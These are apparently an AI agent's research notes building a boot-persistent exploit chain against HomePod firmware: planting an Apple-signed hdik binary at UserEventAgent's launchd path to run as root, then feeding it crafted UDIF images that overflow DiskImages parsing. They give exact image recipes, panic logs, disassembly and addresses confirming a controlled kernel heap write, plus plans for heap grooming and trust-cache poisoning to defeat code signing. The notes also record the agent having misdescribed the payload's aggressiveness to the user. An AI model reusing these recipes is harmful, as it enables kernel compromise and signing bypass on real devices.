sha256 `51ffffbb5734fa1511f247dddce3ac7ff0967685d032b5706637cbf9f5ed79d0`.
`main` decompiled to ~186,958 chars / 2,024 lines. Pseudocode results exceed the
tool's token cap and land in a file, so slice them by character range.

**(c) `hdik` argument parsing, decompiled** `[S]`
- `-shadow` -> `"shadow option not supported"`
- `-nomount` -> `CFDictionarySetValue(dict, @"autodiskmount", kCFBooleanFalse)`
- `-drivekey` / `-encryption` recognised
- any other `-`-prefixed token -> `"unknown option \"%s\""` -> error exit
- first non-dash arg = the image; a second -> `"only one image may be specified"`
- the image goes through `realpath$DARWIN_EXTSN()` then
  `CFDictionarySetValue(dict, @"image-path", ...)`
- attach path: `IOServiceOpen(..., *_mach_task_self_, 0, &handle)`,
  `ioctl(fd, 0x20006415, 5)`, `warnx("attach failed: error 0x%x = %d")`
- every error terminal reaches `exit(1)`

**(d) RULED OUT: the popen/shell idea for `hdik`** `[S]` - there is no shell
invocation anywhere in its argument handling. `hdik` takes exactly one image path
and opens it directly. Do not revisit.

**(e) The direction that session was heading** `[S]`, and it agrees with R64.2:
binaries that **parse a config file at a hardcoded path**, as substitution hosts;
and a file-write primitive via the syslog/`asl.conf` configuration (our R58.3 #2).

### R65.3 — WHERE THIS LEAVES STEP 1

R64.2 established launchd will exec, as root, at a path we control. R65.0 says the
path must be one the **cache already references**. So the shape of the next move is
fixed:

> Put an **already-signed** binary at a `Program` path the MRM cache names, where
> that binary reads something we can write.

Constraints already known:
- **AMFI keys on cdhash, not path** - a signed binary runs from anywhere (job 535
  put `syslogd` at `CrashHousekeeping`'s path).
- **R3.3 closed the argv route** - only 16 of 183 jobs pass any argument and not
  one is a file path, and the cache is integrity-enforced so we cannot add any.
- Therefore the lever is a **hardcoded config path** (R3.2's list), not arguments.
- 11 root `RunAtLoad` hosts exist: `CrashHousekeeping` (proven host), `DumpPanic`,
  `containermanagerd`, `IOMFB_bics_daemon`, `locationd`, `logd`, `keybagd`,
  `lockdownd`, `runningboardd`, `wifiFirmwareLoader`, `wifid`.
- **The System volume has almost no standard Unix tools** (R64.3): no `true`,
  `false`, `echo`, `basename`, `uname`, `env`.

Open and now top priority: **R6.1(b)** - does AMFI accept an Apple-signed binary
that is NOT in *this* build's trust cache? If yes, every binary in any Apple
firmware becomes a candidate and the substitution space widens enormously.

## R66 *** THE ARGV ROUTE IS NOT CLOSED. R3.3 ASKED THE WRONG QUESTION. ***
### 2026-11-27, session 3 (day 2). Offline, from ~/homepod/oldfw/17M61/ota/root/
================================================================================

### R66.0 — `/bin/sh` DOES NOT EXIST on this build [V]

`/bin` contains exactly **`df` and `ps`**. No `sh`, `bash`, `dash`; none in
`/usr/bin` or `/sbin` either. So every shell-mediated idea is dead on arrival:
`pppd`'s `connect`/`init`/`welcome` options (which do exist, and do route through
`/bin/sh` - the binary even carries `"could not exec /bin/sh: %m"`), popen, and
anything of the form `/bin/sh -c`. R65.2(d)'s popen ruling generalises.

Worth recording why this is not merely a missing-file problem: planting a signed
binary AT `/bin/sh` does not help either, because the callers invoke it as
`sh -c <string>` and no signed binary on this volume does anything useful with
`-c`. (`nvram -c` **deletes every NVRAM variable** - the standing "never `nvram`
at `/bin/sh`" rule.)

### R66.1 — But R3.3's closure was too strong [V]

R3.3 closed the argv route because "only 16 of 183 jobs pass an argument beyond
argv[0], and **not one of them is a file path** - every single one is a flag or a
label string."

True, and irrelevant. **The argument does not need to be a file path. It only
needs to be a string we can turn into a path**, and we own the filesystem root.

`hdik`'s decompiled `main` (R65.2(c)): it skips argv[0], and the first argument
not beginning with `-` is taken as the image, resolved with
`realpath$DARWIN_EXTSN()` and stored as `@"image-path"`. A bare relative string
resolves against the process's cwd.

Of 183 jobs, **six** pass a non-dash argv[1]:

| job | argv[1] | user | RunAtLoad | KeepAlive |
|---|---|---|---|---|
| `com.apple.UserEventAgent-System` | `(System)` | **root** | false | **TRUE** |
| `com.apple.cfprefsd.xpc.daemon` | `daemon` | root | false | false |
| `com.apple.ReportCrash.SimulateCrash` | `com.apple.ReportCrash.SimulateCrash` | root | false | false |
| `com.apple.osanalytics.osanalyticshelper` | `com.apple.osanalytics.osanalyticshelper` | root | false | false |
| `com.apple.OTATaskingAgent` | `server-init` | root | false | false |
| `com.apple.distnoted.xpc.daemon` | `daemon` | _distnote | false | false |

Only **3 of 183 jobs** set a `WorkingDirectory` (two IDS agents and
`imtransferagent`, all `/tmp`), so every other job inherits launchd's cwd, `/`.

### R66.2 — THE CHAIN

`com.apple.UserEventAgent-System` is the one that runs at boot: **root**,
`KeepAlive: True` (launchd starts it and restarts it), `POSIXSpawnType
Interactive`, no `WorkingDirectory`.

1. Substitute `/usr/sbin/hdik` (56,832 B, Apple-signed, in **this** build's trust
   cache - no R6.1(b) dependency) at `/usr/libexec/UserEventAgent`.
   AMFI keys on cdhash, not path (job 535 precedent: `syslogd` at
   `CrashHousekeeping`'s path). Keep the original as `.nfoff`.
   The path stays occupied, so R64.1's missing-executable panic cannot fire.
2. Write our UDIF image to **`/(System)`** on the System volume.
3. Re-snapshot under the same name (R63.0: the snapshot is the booted filesystem).
4. Boot. launchd spawns argv `['/usr/libexec/UserEventAgent', '(System)']` as
   root; hdik skips argv[0], sees `(System)`, `realpath()`s it against `/`, opens
   `/(System)`, and parses it.

Payload: `route2/runcount.dmg` (1,802 B, valid `koly` trailer) - **R27 Recipe A
variant 1**, `blocksRunCount = 2` with a 0xCC-byte Data, the deliberately gentle
variant built to prove the missing bound rather than over-read 640 MB. L10162
recorded it as held back because it "could panic the boot kernel." That is now
the objective.

### R66.3 — TWO independent observables, neither needing our code to cooperate

1. **hdik's own stderr.** Its error terminals are `warnx()` -> `exit(1)`
   (`"unknown option \"%s\""`, `"only one image may be specified"`,
   `"attach failed: error 0x%x = %d"`, `"unable to locate attached image"`).
   launchd captures a job's stderr into os_log, so ANY of these appearing under
   the `UserEventAgent` label **proves the substitution executed as root at boot** -
   even if the image is rejected. This is the first execution proof in this project
   that depends on neither NVRAM nor a marker.
2. **A kernel panic in `/dev/disk4`**, now a calibrated channel (R65.1: 262,144 B
   with content when a panic exists, size=0 when not; read with `bs=1024
   count=256`). Hits for `UDIF`/`KDI`/`HDIX`/`DiskImages`/`hdik` would prove the
   kernel-write primitive fired.

### R66.4 — Risks, and why they are acceptable

- `KeepAlive: True` means a non-panicking hdik exits and is respawned in a loop.
  Noisy, survivable; UserEventAgent is not a boot task, so its failure is not fatal.
- A successful panic gives a **boot loop**. Recovery is DFU + the ramdisk, exactly
  as performed for R64.1 - and the `.nfoff` original is on the volume for rollback.
- Replacing UserEventAgent degrades `remoted` and `xpc.activity` services. Fine for
  a test boot.
- The one thing to avoid: do NOT use `cfprefsd` as the host. It is essential and
  replacing it would likely prevent a usable boot.

## R67 ***** STEPS 1 AND 2 ACHIEVED. OUR CODE RAN AS ROOT ON AN UNASSISTED
##       BOOT AND REACHED THE KERNEL BUG. PREDICTED pc HIT EXACTLY. *****
### 2026-11-27, session 3 (day 2). Jobs 652/653/654.
================================================================================

### R67.0 — What happened

Job 652 substituted `/usr/sbin/hdik` at `/usr/libexec/UserEventAgent` and wrote
`route2/runcount.dmg` to `/(System)`, then re-snapshotted (R63.0: the snapshot is
the booted filesystem). The pod was cold-booted with **no host attached**.

It booted, ran ~4m40s, and **panicked**. It did so twice, on two separate boots.
`idevicecrashreport` recovered both as `panic-full-*.ips`.

> Note: `/dev/disk4` read **size=0** in job 653 even though a panic had occurred.
> R65.1's calibration is therefore incomplete - the disk4 channel does NOT reliably
> hold the panic. **`idevicecrashreport` is the reliable panic channel**, and it
> also returns `ResetCounter-*.ips`. Use it.

### R67.1 — The panic, and the prediction it fulfils

```
panic(cpu 1 caller 0xfffffff013451b78): Kernel data abort.
  at pc 0xfffffff0135cc080, lr 0xfffffff0135cc098
  esr: 0x96000007   far: 0xfffffff06e731000     <- PAGE BOUNDARY
  x19: 0xfffffff06e730fe4                       <- cursor, just below it
  x27: 0x0000000000ffffff
Panicked task: pid 0: kernel_task
Kernel slide: 0x000000000b800000
```

Unslid: **pc = `0xfffffff007dcc080`**. The second panic, at a *different* KASLR
slide (`0x20c00000`), unslides to **the identical pc**.

R27 wrote this prediction days ago, at L8334-8338:

> RECIPE A: Data = exactly 0xCC bytes, header only, no entries,
> **blocksRunCount = 0x01000000**. Walk reads ~640 MB past a ~208-byte alloc ->
> first unmapped page faults. **Expect a synchronous data abort with pc on
> `0xfffffff007dcc080` (`ldp q0,q1,[x19]`)**, esr 0x96000006, DURING hdik ATTACH.
> **Match on the offset from the kext base, not the absolute pc (the cache slides).**

Every element matched:

| predicted | observed |
|---|---|
| pc `0xfffffff007dcc080` | **`0xfffffff007dcc080`**, twice, across two different slides |
| `ldp q0,q1,[x19]` - x19 is the cursor | `far` = x19 rounded up to the page boundary |
| data abort | `esr 0x96000007` (predicted `...06`; both are translation faults, level differs) |
| walk counter = runCount-1 | **`x27 = 0x00ffffff` = 0x01000000 - 1** |
| during hdik attach | panicking task is `kernel_task`; stackshot has **pid 160 `UserEventAgent`** (our hdik, running under the job's name) |

The image itself, parsed back: `koly` valid, XML plist at 512, one `blkx`
resource named `whole disk`, **Data = 204 bytes = 0xCC**, **blocksRunCount @0xC8 =
16777216 = 0x01000000**. `merge_blkx` is at `0xfffffff007dcbf38`; the faulting
instruction is 0x148 into it, in the run-walk that L8209 identified as trusting
`blocksRunCount` unbounded (CVE-2020-9965/9966 family).

**CORRECTION to what I told the user before the run:** I described `runcount.dmg`
as "the deliberately gentle variant 1 (`blocksRunCount = 2`)". It is not - it is
**Recipe A, `blocksRunCount = 0x01000000`**, the aggressive one. L8339 *recommends*
running variant 1 first; the file on disk was never variant 1. The test was more
aggressive than I represented it.

### R67.2 — What this proves

1. **STEP 1 ACHIEVED.** launchd exec'd a binary of our choosing, **as root**, on a
   normal unassisted cold boot with **no host attached**, from a filesystem we
   control - and fed it an argument that became a path to our file. No sandbox
   escape, no AMFI bypass, no trust-cache modification: `hdik` is Apple-signed and
   in this build's trust cache, and AMFI keys on cdhash, not path.
2. **STEP 2 ACHIEVED.** That execution reached the UDIF parser and triggered the
   kernel memory-safety defect at the exact predicted instruction.
3. **R3.3's closure is formally overturned** (R66.1): the argument never needed to
   be a file path, only a string we could turn into one.
4. The whole 0-for-38 null streak is accounted for: R63.0 (the boot mounts the
   snapshot, so live-volume plants were never in the booted filesystem), R63.1
   (`CleanupPreparePathService` reverted them anyway), R65.0 (loose LaunchDaemon
   plists are not honoured), R48 (op 102 killed the shebang payloads), and R59
   (plain `nvram` markers could not survive an unplug regardless).

### R67.3 — What is still missing for UNTETHERED

What we have is a **read** overflow that faults. Untethered needs a controlled
**write**, then a trust cache, then step 1-3 re-running every boot (which the
snapshot already gives us).

The write primitive is already designed - R27 **RECIPE B** (Candidate B,
the `compressedLength` underflow at L8223-8240: `src = bufEnd - compressedLength`
with no bound, so the backing store writes `compressedLength` attacker bytes
BELOW the allocation):

> Data = 0x11C bytes; `decompressBufferRequested = 1` (allocSize 512);
> `blocksRunCount = 2`; entry[0] entryType `0x80000007` (LZFSE), sectorNumber 0,
> sectorCount 1, compressedOffset 0, `compressedLength = 0x10000000`.
> File must be >= 256 MiB (sparse is fine).

Building that image is **offline work**; the delivery mechanism is now proven and
unchanged - drop it at `/(System)`, re-snapshot, boot.

### R67.4 — Operational state

The pod currently panics ~4m40s into every boot. That is the payload working as
designed, not damage. Rollback is one job: copy
`/usr/libexec/UserEventAgent.nfoff` (60,576 B, the real agent) back over
`/usr/libexec/UserEventAgent`, delete `/(System)`, re-snapshot.

Capture rule learned the hard way in job 653: a `sleep 300` before `syslog`
collided with the crash and returned `mode=none`, losing the log entirely.
**Time any post-boot capture to land well inside the crash window** - job 654 used
`sleep 110` and got both the archive and the crash reports.

## R69 *** CANDIDATE B IS UNREACHABLE: NOTHING READS THE ATTACHED IMAGE ***
### 2026-11-27, session 3 (day 2). Jobs 655-660. A clean negative.
================================================================================

### R69.0 — Three payloads, one conclusion

| payload | fires in | result |
|---|---|---|
| Recipe A, `blocksRunCount = 0x01000000` | `merge_blkx` - table build, **at attach** | **panics, reliably, twice** (R67) |
| Recipe B zlib, `compLength 0x1000` | `KDIUDIFDiskImage::read` | nothing, 7 min |
| Recipe B zlib, `compLength 0x10000` (16x reach) | same | nothing, 7 min |
| Recipe B **LZFSE**, `compLength 0x1000` | same | nothing, 7 min |

The LZFSE case is decisive. R27 (L8243-8248) established the zlib wrapper has an
overlap guard at `0xdcdd5c` that errors out once `src < dst`, so the decoder never
dereferences the underflowed pointer - zlib is silent **by design**. **LZFSE has no
such guard.** If `KDIUDIFDiskImage::read` ever executed, the LZFSE decoder would
dereference the bad pointer and fault immediately and loudly. It did not.

**Conclusion: `KDIUDIFDiskImage::read` is never invoked. Nothing reads sector 0 of
the attached device.** Candidate B - the controlled heap-underflow WRITE, the best
primitive in this project - is **unreachable through the current delivery path.**
It is not disproven; the code analysis in R27/R33 still stands. It simply never runs.

### R69.1 — [RETRACTED, see R69.1b] Why, most likely: our images are degenerate and attach never completes

Recipe A fires during the **table build**, which happens before any client exists.
Recipe B needs a **client read**. Candidates for who would read, and why none does:
- there is no `diskarbitrationd` on this platform to probe a new device;
- `hdik`'s decompiled `main` (R65.2(c)) does `IOServiceOpen` + `ioctl(0x20006415)`
  and reports - **it never reads back**;
- the signed cache gives argv `['/usr/libexec/UserEventAgent','(System)']`, so we
  cannot pass `-nomount` or any other flag to influence this.

And the most probable proximate cause: **our images are minimal and almost
certainly fail the attach immediately after the table is built.** Every one has a
single `blkx` declaring `sectorCount = 1` plus a `0xFFFFFFFF` terminator, a data
fork that is not a filesystem, and no partition map. If `IOMedia` is never
published, nothing can read it.

### R69.1b *** RETRACTION: THE ATTACH SUCCEEDS. A DEVICE IS PUBLISHED. *** [V]

R69.1's guess was wrong and the logs we already had disprove it:

```
kernel[0]: (Sandbox) identified disk5 as removable
kernel[0]: (Sandbox) identified disk5 as a disk image
```

| boot | payload | disk5 present? |
|---|---|---|
| 642 | none (pre-substitution) | **no** |
| 654 | Recipe A | **no** - it panics during table build, before attach completes |
| 656 | Recipe B zlib 4 KB | **YES** |
| 658 | Recipe B zlib 64 KB | **YES** |
| 660 | Recipe B LZFSE | **YES** |

So hdik attaches our image and the kernel publishes an **IOMedia** for it. Recipe A's
absence from this list independently corroborates that it fires at table-build time,
before the device exists.

**The real reason nothing reads it: the image declares `sectorCount = 1`.**
Every Recipe B build so far describes a **512-byte disk**. No partition scheme probes
a 512-byte device - it is too small to hold any partition map, and there is nothing
to mount. The read path was never going to run, not because the attach failed but
because there was nothing worth reading.

**This is a far better position than R69.0 implied:** steps 1 and 2 of the delivery
are sound AND the device publishes. The only defect was the declared geometry.

### R69.2 — THE FIX: a realistically-sized image with ONE poisoned chunk at sector 0

`route2/recipeB4m.dmg`, 5,625 B, built and verified:
```
koly.sectorCount = 8192   hdr.sectorCount = 8192   runCount = 3   bufReq = 1
  run[0] zlib POISONED  sector    0 +1      compLength = 0x1000
  run[1] zero-fill      sector    1 +8191
  run[2] terminator     sector 8192 +0
sectors covered by runs = 8192 = header  -> COHERENT
```
A 4 MB device, large enough for a partition scheme to probe, with the poisoned
chunk on **sector 0** - the first sector any probe reads. Zero-fill for the
remainder costs no data fork, so the file stays small.

Older framing, kept because the principle still holds:
- a real data fork of plausible size (a few MB of zeros is fine),
- a `blkx` table of **real, well-formed runs** covering the whole sector range
  (raw `0x00000001` or zero-fill `0x00000002` entries), so geometry is coherent
  and the attach completes and publishes an `IOMedia`,
- then poison **exactly one** chunk's `compressedLength` (Candidate B) while
  leaving every other field legitimate.

Then the attach succeeds, something probes block 0, the poisoned chunk is read,
and the write fires. **This is offline work and costs no pod time to prepare.**

Worth testing first and cheaply: whether a *valid* image attaches at all under
this delivery, by watching for any change in behaviour. We have no stderr from
hdik (R68.3), so the only observable remains the panic - which argues for keeping
a Candidate A tripwire chunk in the same image as a positive control.

### R69.3 — Where the project actually stands tonight

**ACHIEVED and solid:**
- **Step 1** - arbitrary Apple-signed binary executed **as root**, on an
  unassisted cold boot, **no host attached**, from a filesystem we control, with
  an argument we turned into a path of our choosing (R66, R67).
- **Step 2** - that execution reaches the kernel and triggers a memory-safety
  defect at a **predicted** instruction (R67).
- The delivery chain is repeatable and cheap to iterate: change one file,
  re-snapshot, boot.

**NOT achieved:**
- **Step 3** - a controlled kernel **write**. Candidate B is designed and
  code-proven but unreachable as delivered (this section). Candidate A gives a
  read overflow that panics, not a controlled write.

**The gap between where we are and untethered is now exactly one thing: turning
the proven foothold into a controlled write.** That is a much narrower problem
than this morning's, when the blocker was "nothing of ours has ever executed."

## R70 ***** STEP 3: THE CONTROLLED KERNEL HEAP WRITE IS CONFIRMED *****
### 2026-11-27, session 3 (day 2). Jobs 661/663. Candidate B, proven on hardware.
================================================================================

### R70.0 — The panic, verbatim

```
panic(cpu 0 caller 0xfffffff018cd54a8): "Zone cache element was used after free!
  Element 0xfffffff08b62b000 was corrupted at beginning;
  Expected 0xdd9b184d37c9c672 but found 0x4443424144434241;
  canary 0x2264e7bdbcab7672; zone 0xfffffff019d33958 (kalloc.512)"
Panicked task 0xfffffff08b54a400: 113 pages, 1 threads: pid 32: configd
```

**`found 0x4443424144434241`** is a little-endian 64-bit word. In memory order:

```
0x4443424144434241  ->  41 42 43 44 41 42 43 44  ->  "ABCDABCD"
```

Our data fork is `b'\x41\x42\x43\x44'` repeating. **The kernel's own zone allocator
printed our bytes back to us.** (A grep for the literal string `41424344` returns
zero hits - the value is rendered byte-reversed. Do not conclude "signature absent"
from that.)

### R70.1 — Every element of the L8347 prediction matched

| predicted (written days earlier) | observed |
|---|---|
| "a DELAYED zone-integrity panic" | delayed - fired when `configd` later reused the element |
| "a freed zone element has been modified" | *"Zone cache element was used after free! ... corrupted at beginning"* |
| "in zone **kalloc.512**" | `zone 0xfffffff019d33958 (kalloc.512)` |
| "Fill with 0x41424344 repeating so the panic log's corrupted-value field confirms the source" | `found 0x4443424144434241` = our bytes |

### R70.2 — What was actually required, and it was not payload strength

Three Recipe B builds produced nothing (R68/R69.0): zlib 4 KB, zlib 64 KB (16x the
reach), and LZFSE 4 KB. The fix was **geometry, not force**:

- those images declared `sectorCount = 1` - a **512-byte disk**. Nothing probes a
  512-byte device, so sector 0 was never read and `KDIUDIFDiskImage::read` never ran;
- `recipeB4m.dmg` declares **8192 sectors (4 MB)** with coherent runs
  (poisoned zlib chunk on sector 0, zero-fill for 1..8191, terminator) - large
  enough that a partition scheme probes it, and the probe reads **sector 0**, which
  is exactly where the poisoned chunk sits.

The attach had been succeeding all along (R69.1b: `disk5` published on every
Recipe B boot). **The bug was never unreachable - our disk was just too small to be
worth reading.**

### R70.3 — The primitive, stated precisely

On a normal unassisted cold boot, no host attached:
- **4096 bytes** of **fully attacker-chosen content**
- written into the **kernel heap**, into `kalloc.512`
- at `bufEnd - compressedLength`, with `compressedLength` attacker-controlled and
  **never bounded** (R27 Candidate B; R33 proved all 29 flag-setting instructions
  in `merge_blkx` ignore it)
- both **length and content** under our control, and the offset selectable by
  varying `compressedLength`

zlib was the right codec: its overlap guard at `0xdcdd5c` stops the decoder from
ever dereferencing the bad pointer, so this panic implicates **the write** and
nothing else. The write at `0xdcb6a0` has already landed by then.

### R70.4 — THE UNTETHER CHAIN, AS IT NOW STANDS

| step | status |
|---|---|
| 1. Code exec as root on an unassisted boot, from a filesystem we control | **DONE** (R66/R67) |
| 2. Reach the kernel bug | **DONE** (R67, predicted pc hit exactly) |
| 3. Controlled kernel heap write | **DONE** (this section) |
| 4. Turn the write into AMFI defeat / loadable trust cache | **NEXT** |
| 5. Persist - steps 1-3 re-run every boot | **already free** - it is all in the snapshot |

Step 5 was never the hard part once R63/R64 gave us the snapshot and the
substitution; it re-arms itself every boot with no host.

**What step 4 needs:** today the write lands on whatever `kalloc.512` element
happens to be adjacent. To be useful it must land on something chosen. That is
heap grooming plus target selection - a different kind of work from everything so
far, and the first step is deciding what object to aim at.

### R70.5 — Operational note

The pod now **boot-loops**, because the corruption reliably kills `configd` (or
whoever reuses the element) shortly after boot. That is the exploit working.
Rollback is staged at `route2/rollback.sh` (restore `UserEventAgent` from
`.nfoff`, delete `/(System)`, re-snapshot) and needs only a DFU + ramdisk session.

## R71 — THE WRITE PRIMITIVE, CHARACTERISED EXACTLY. And what step 4 needs.
### 2026-11-27, session 3 (day 2). Offline, from kernelcache.b238.macho.
================================================================================

### R71.0 — Length and distance are COUPLED. Verified, not assumed.

zlib path, disassembled at file offset 0xdc7630 (R27 cited 0xdc767c):
```
0xdc767c  add  x8, x20, x19        ; bufEnd = buf + allocSize
0xdc7680  ldp  x2, x1, [sp,#0x58]  ; x2 = compressedLength, x1 = compressedOffset
0xdc7684  sub  x19, x8, x2         ; dst = bufEnd - compressedLength
0xdc7688  ldr  x0, [sp,#0x30]      ; backing store object
0xdc768c  ldr  x8, [x0]            ; vtable
0xdc7690  ldr  x8, [x8,#0x590]     ; vtable+0x590 = read
0xdc7694  sub  x3, x29, #0x58      ; &actual
0xdc7698  mov  x4, x19             ; dst
0xdc769c  ldr  w5, [sp,#0x3c]      ; flags
0xdc76a0  blr  x8
```
`read(this, offset=x1, length=x2, &actual, dst=x4, flags=w5)`.

**`x2` is BOTH the length argument AND the subtrahend.** LZFSE identical
(`sub x4, x8, x2` at 0xdc776c). So:

> the write always **ends at `bufEnd`** and extends **backward** by exactly
> `compressedLength` bytes.

**This is NOT an arbitrary write.** Reaching a distant target means overwriting
everything between it and `bufEnd`. R27's description was precise and my hope of a
decoupled dst/len was wrong.

### R71.1 — But the shape is good, and there are THREE independent controls

From the same disassembly (`lsl w26, w8, #9` at 0xdc7638, where
w8 = `[table+0x20]` = decompressBufferRequested):

| control | mechanism | consequence |
|---|---|---|
| **which kalloc zone** | `allocSize = decompressBufferRequested * 512`, clamped <= 0x400000 at 0xdcc194 | we **choose the zone** our buffer lands in - kalloc.512, .1024, .2048 ... |
| **how far back** | `compressedLength` | choose exactly how many bytes below `bufEnd` to clobber |
| **content** | file bytes at `compressedOffset`, our file | **fully arbitrary**, byte for byte |

Concretely: with `decompressBufferRequested = 1` (512 B, kalloc.512) and
`compressedLength = 1024`, we overwrite **exactly the one preceding kalloc.512
element, in full, with chosen content** - and our own buffer. That is a surgical
single-element overwrite, not a blind smear. R70's panic is precisely this,
with the preceding element having been freed.

### R71.2 — What step 4 now requires

The primitive is sound. The missing pieces are the classic two:

1. **GROOMING - put a chosen object immediately below our buffer.**
   Our only "program" at boot is hdik parsing an image we wrote. But the image
   controls the allocation pattern: number of blkx resources, number of chunks,
   and `decompressBufferRequested` per table (zone selection). Whether that is
   enough shaping to place a *chosen* object adjacent is the open question.
   **Constraint worth stating plainly: we cannot spray from userspace at will.
   We get only the allocations the DiskImages path makes while parsing our file.**

2. **KASLR - an address to put in any pointer we forge.**
   Panic logs print `Kernel slide` (R67), but a panic reboots the device and the
   next boot reslides, so that is not usable inside an exploit. We have **no
   in-exploit info leak**. Any plan that needs a kernel pointer needs one first.

### R71.3 — Therefore, the honest next moves, cheapest first

- **(a) OFFLINE, no pod:** enumerate what the DiskImages read path allocates while
  parsing an attacker image, and in which zones. That is the grooming inventory
  and it decides whether (1) is even possible. Start at
  `KDIUDIFDiskImage::read` 0xdcb3bc-0xdcb96c, which R33 already enumerated for
  compares - re-walk it for `kalloc`/`kfree` instead.
- **(b) OFFLINE, no pod:** look for a data-only target - something whose
  corruption helps without needing a kernel pointer. A length field, a flags word,
  a refcount, a cached cdhash. Data-only beats pointer-forging precisely because
  it needs no KASLR defeat.
- **(c) OFFLINE:** locate the dynamic trust-cache global. R36 proposed an XREF from
  `pmap_lookup_in_loaded_trust_caches`, but **that symbol is not in this stripped
  kernelcache** (0 string hits). Available anchors instead: AMFI's
  `loadTrustCache` dispatch ~0xfffffff007c960d8 and gate 0xfffffff007c961f4 (R24.4),
  and the string "Trying to load a trust cache" (1 hit). Follow the store that
  publishes a loaded cache.
- **(d) Hardware, only once (a)/(b) say what to aim at.** No more boots spent
  guessing - today's lesson from the 4 KB / 64 KB / LZFSE sequence is that three
  boots spent escalating blindly taught us less than one log re-read did.

## R72 — ADDRESSING CONVENTION TRAP IN THESE NOTES. Read before any kernelcache work.
### 2026-11-27, session 3 (day 2)
================================================================================

### R72.0 — The kernelcache segment map, measured [V]

`route2/kernelcache.b238.macho`, 24,945,952 B, arm64 Mach-O. Parsed from its own
load commands:

| segment | VA range | file range | delta (VA - file) |
|---|---|---|---|
| `__TEXT` | `0xfffffff007004000`-`0xfffffff0074a0000` | `0x0000000`-`0x049c000` | `0xfffffff007004000` |
| `__DATA_CONST` | `0xfffffff0074a0000`-`0xfffffff007640000` | `0x049c000`-`0x063c000` | `0xfffffff007004000` |
| `__TEXT_EXEC` | `0xfffffff007640000`-`0xfffffff00863c000` | `0x063c000`-`0x1638000` | `0xfffffff007004000` |
| `__DATA` | `0xfffffff008644000`-`0xfffffff0087f4000` | `0x1640000`-`0x172c000` | `0xfffffff007004000` |
| `__BOOTDATA`, `__PRELINK_INFO`, `__LINKEDIT` | — | — | **`0xfffffff0070c8000`** |

**`file_offset = VA - 0xfffffff007004000`** for all code and ordinary data.
Two segments use a different delta - always check which segment a VA is in.
`__DATA.__common` and `__DATA.__bss` have **fileoff 0** (no file backing): a
global can have a valid VA with no bytes in the file at all.

### R72.1 — THE TRAP: these notes mix VAs and file offsets without saying which

R27/R33 record addresses in two conventions and never reconcile them:
- **bare numbers** - `0xdcbf38`, `0xdcc060`, `0xdcc080`, `0xdcc194`, `0xdcb3bc`,
  `0xdcb96c` - are **VA low bits**. Prepend `0xfffffff007`.
- a few say **"fileoff"** - `0xdc767c`, `0xdc7760` - and those are **true file
  offsets**.

The two differ by exactly `0x4000`, which is small enough that a wrong conversion
still lands inside a plausible-looking function and disassembles cleanly. **That is
what makes it dangerous.** I briefed three analysis agents with
`VA - 0xfffffff007000000` and had to recall it.

**Test that settles it instantly:** VA `0xfffffff007dcc080` is known from a real
device panic (R67) to be `ldp q0, q1, [x19]`.
```
delta 0xfffffff007000000 -> file 0xdcc080 -> "mov w15, #-1"        WRONG
delta 0xfffffff007004000 -> file 0xdc8080 -> "ldp q0, q1, [x19]"   CORRECT
```

### R72.2 — Independent re-derivation of R67 from the binary alone [V]

Disassembling around the corrected offset confirms the whole Candidate A story
without reference to any prior note:
```
0xfffffff007dcc060  ldr  w9, [x22, #0xc8]     ; blocksRunCount  (attacker controlled)
0xfffffff007dcc064  rev  w9, w9               ; big-endian swap
0xfffffff007dcc068  subs w9, w9, #1           ; n = runCount - 1
0xfffffff007dcc074  add  x19, x22, #0xcc      ; x19 = &runs[0]   -> runs at table+0xCC
0xfffffff007dcc07c  mov  w27, w9              ; w27 = runCount-1
0xfffffff007dcc080  ldp  q0, q1, [x19]        ; THE PANIC PC
0xfffffff007dcc094  bl   0xfffffff007d9b364   ; swap_BLKXChunkEntry (R33's address)
```
`mov w27, w9` is **why our panic carried `x27 = 0x00ffffff`** - it is
`blocksRunCount - 1` for our `0x01000000`. `add x19, x22, #0xcc` confirms the run
array begins at table+0xCC, which is how the images were built. R33's
`swap_BLKXChunkEntry` VA matches exactly.

### R72.3 — Standing rule

**Never cite an address in these notes without saying VA or file offset, and never
act on an address from the notes without disassembling it first and confirming the
instructions match what the note claims is there.** A 0x4000 error disassembles
cleanly and lies quietly.

### R74.3 — THE VERDICT: NOT REACHABLE WITH THE R71 PRIMITIVE. Three independent
### reasons, each sufficient alone.

  (a) **The head is kernel global data in __DATA.__bss, not heap.** R71's write
      lands at [bufEnd - compressedLength, bufEnd) INSIDE a kalloc'd buffer. The
      offset is anchored to the victim allocation, not attacker-chosen. A bounded
      underflow below a heap chunk cannot address a __bss global at all. **No
      amount of grooming changes this** — it is a different region, not a far one.
  (b) **Appending needs a forged kernel pointer and we have no KASLR leak.** The
      publish stores the node's kernel VA. To append you must know the slid head
      address (slot is zerofill — no static value) AND the address of your node.
      This is exactly the "pointer-forging requiring KASLR defeat" that R71.3(b)
      says to avoid.
  (c) **There is no existing node to corrupt instead.** The attractive fallback —
      leave the head alone, corrupt a live node's next at +0, which IS heap — fails
      because on a stock pod the list is EMPTY. The sole publisher is gated behind
      both the can-load-trust-cache entitlement and an ECID-personalised Image4
      'ltrs' manifest, i.e. behind the very thing we are trying to bypass.
      (INFERENCE from single-publisher analysis, high confidence; the head's
      runtime value is zerofill so emptiness cannot be OBSERVED statically.)

**=> R36 MUST BE AMENDED.** Its phrasing "we need only find the dynamic cache's
global and add a node" silently assumes arbitrary kernel write plus a known
address. Finding the global was NEVER the blocker. The blocker is write-anywhere
plus an info leak. Locating it (done, exactly, above) does not advance the
exploit by itself. What it DOES buy: if we ever get arbitrary write + a leak,
trust-cache poisoning is a pure data patch and KPP will not stand in the way.
Bank it as a post-leak payload, not as a route to the leak.

        0xfffffff007dcca24  entry->buf = IOMalloc(newSectorCount x 512)

  order, then retries the alloc at 0xdcb880. **Caveat the agent found and flagged

  80-byte objects but LEAKS the big buffers — K4 shapes zone 80 only, and K3

## R78 — THE SIBLING READ PATH IS THE GROOMING ENGINE, NOT A SECOND VICTIM.
## Clean negative on the underflow, and a 1-BYTE-GRANULAR allocation primitive.

Agent aa73612c9da2d4b4d, follow-up. Function 0xfffffff007dcb96c..0xfffffff007dcbc28
(176 words, sweep asserted 176/176).

### R78.1 — No underflow there. Clean negative WITH a positive control.

Bitwise enumeration of every SUB-class encoding over the function returns
**exactly one** instruction: the prologue `sub sp,sp,#0xb0` (ffc302d1). The
identical enumeration over `read()` returns **12** and catches both known sites
(0xdcb684 `sub x19,x8,x2` 130102cb; 0xdcb76c `sub x4,x8,x2` 040102cb). So the
